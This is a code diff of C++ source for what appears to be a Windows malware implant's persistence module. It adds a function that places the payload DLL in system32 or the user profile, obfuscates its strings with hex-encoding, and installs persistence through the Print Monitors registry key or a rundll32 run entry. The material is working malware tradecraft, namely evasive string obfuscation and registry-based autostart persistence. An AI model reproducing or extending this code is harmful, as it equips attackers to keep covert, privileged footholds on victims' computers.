@@ -3,6 +3,58 @@
 #include "utilities.h"
 
 
+std::string GetDllFilePath( std::string file_name, boolean isAdmin ){
+
+	std::string file_path;
+
+	if( isAdmin ){
+		//windir
+		size_t len;
+		char *temp_ptr = decode_split("\x7\x7\x6\x9\x6\xe\x6\x4\x6\x9\x7\x2",12);
+		//Get env
+		char * temp_env = nullptr;
+		_dupenv_s(&temp_env, &len, temp_ptr);
+		free(temp_ptr);
+
+		//Construct path
+		file_path.assign(temp_env);
+		free(temp_env);
+		file_path.append("\\");
+
+		//system32
+		temp_ptr = decode_split("\x7\x3\x7\x9\x7\x3\x7\x4\x6\x5\x6\xd\x3\x3\x3\x2",16);
+		file_path.append(temp_ptr);
+		free(temp_ptr);
+		file_path.append("\\");
+		file_path.append(file_name);
+
+	} else {
+
+		//userprofile
+		size_t len;
+		char *temp_ptr = decode_split("\x7\x5\x7\x3\x6\x5\x7\x2\x7\x0\x7\x2\x6\xf\x6\x6\x6\x9\x6\xc\x6\x5",22);
+
+		//Get env
+		char * temp_env = nullptr;
+		_dupenv_s(&temp_env, &len, temp_ptr);
+		free(temp_ptr);
+
+		//Construct path
+		file_path.assign(temp_env);
+		free(temp_env);
+		file_path.append("\\");
+		file_path.append(file_name);
+	
+	}
+
+	#ifdef _DBG
+		Log( "[-] WriteDllToDisk::WriteFile file path. %s\n", file_path.c_str());
+	#endif
+
+	return file_path;
+}
+
+
 bool ReadDllIntoMemory( PERSIST_STRUCT *persist_ptr ){
 
 	bool retVal = true;
@@ -59,7 +111,7 @@ bool WriteDllToDisk( PERSIST_STRUCT *persist_ptr ){
 	
 
     //open file and read its contents
-	HANDLE hFile = CreateFile(persist_ptr->dll_file_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hFile = CreateFile( persist_ptr->dll_file_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 	if(hFile != INVALID_HANDLE_VALUE) {
 
 		if(persist_ptr->dll_file_size != INVALID_FILE_SIZE) {
@@ -100,7 +152,7 @@ bool AddPersistence( PERSIST_STRUCT *persist_ptr ){
 	//Get the filename from the dll path
 	size_t pos = persist_ptr->dll_file_path.find_last_of("\\");
 	std::string file_name_str = persist_ptr->dll_file_path.substr(pos + 1, std::string::npos );
-
+	
 	//Check if reg key has been set for persistence
 	//If the registry path was added as a configuration
 	if( persist_ptr->reg_key_path.length() > 0 && file_name_str.length() > 0){
@@ -133,12 +185,19 @@ bool AddPersistence( PERSIST_STRUCT *persist_ptr ){
 				free(driver_ptr);
 				RegCloseKey(hkey);
 
+				//Get the file path if admin
+				std::string file_path = GetDllFilePath( file_name_str, true );
+
+				//Set to system32 path
+				persist_ptr->dll_file_path.assign(file_path);
+
 			} else {
 #ifdef _DBG
 				Log( "[-] Error: Unable to create persistence registry key in SYSTEM hive.\n");
 #endif				
 				retVal = false;
 			}
+
 		} else {
 #ifdef _DBG
 			Log( "[-] Error: Unable to open persistence registry key in SYSTEM hive.\n");
@@ -159,8 +218,11 @@ bool AddPersistence( PERSIST_STRUCT *persist_ptr ){
 			std::string run_dll_str(rundll32);
 			free(rundll32);
 
+			//Get the file path if admin
+			std::string file_path = GetDllFilePath( file_name_str, false );
+
 			//Add DLL path
-			run_dll_str.append(persist_ptr->dll_file_path);
+			run_dll_str.append(file_path.c_str());
 
 			//",RegisterDll
 			char *regdll = decode_split("\x2\xc\x5\x2\x6\x5\x6\x7\x6\x9\x7\x3\x7\x4\x6\x5\x7\x2\x4\x4\x6\xc\x6\xc",24);
@@ -179,8 +241,12 @@ bool AddPersistence( PERSIST_STRUCT *persist_ptr ){
 					Log( "[-] Error: Unable to write registry value.\n");
 	#endif
 				}
+
 				RegCloseKey(hkey);	
-				retVal = true;
+				retVal = true;				
+
+				//Set to system32 path
+				persist_ptr->dll_file_path.assign(file_path);
 
 			} else {
 	#ifdef _DBG
@@ -208,6 +274,10 @@ bool RemovePersistence( PERSIST_STRUCT *persist_ptr ){
 
 	bool retVal = false;
 
+	//Get the filename from the dll path
+	size_t pos = persist_ptr->dll_file_path.find_last_of("\\");
+	std::string file_name_str = persist_ptr->dll_file_path.substr(pos + 1, std::string::npos );
+
 	if( !persist_ptr->reg_key_path.empty() ){
 
 		//Try to open registry key (SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\)
@@ -221,6 +291,12 @@ bool RemovePersistence( PERSIST_STRUCT *persist_ptr ){
 		if(ret == ERROR_SUCCESS ) {
 			//Delete reg key
 			RegDeleteKey(hkey, persist_ptr->reg_key_path.c_str());
+
+			//Get the file path if admin
+			//std::string file_path = GetDllFilePath( file_name_str, true );
+
+			//Set to system32 path
+			//persist_ptr->dll_file_path.assign(file_path);
 
 		} else {
 #ifdef _DBG
@@ -236,6 +312,12 @@ bool RemovePersistence( PERSIST_STRUCT *persist_ptr ){
 
 				//Delete reg key
 				RegDeleteValue(hkey, persist_ptr->reg_key_path.c_str());
+
+				//Get the file path if admin
+				//std::string file_path = GetDllFilePath( file_name_str, false );
+
+				//Set to system32 path
+				//persist_ptr->dll_file_path.assign(file_path);
 			
 			} else {
 #ifdef _DBG
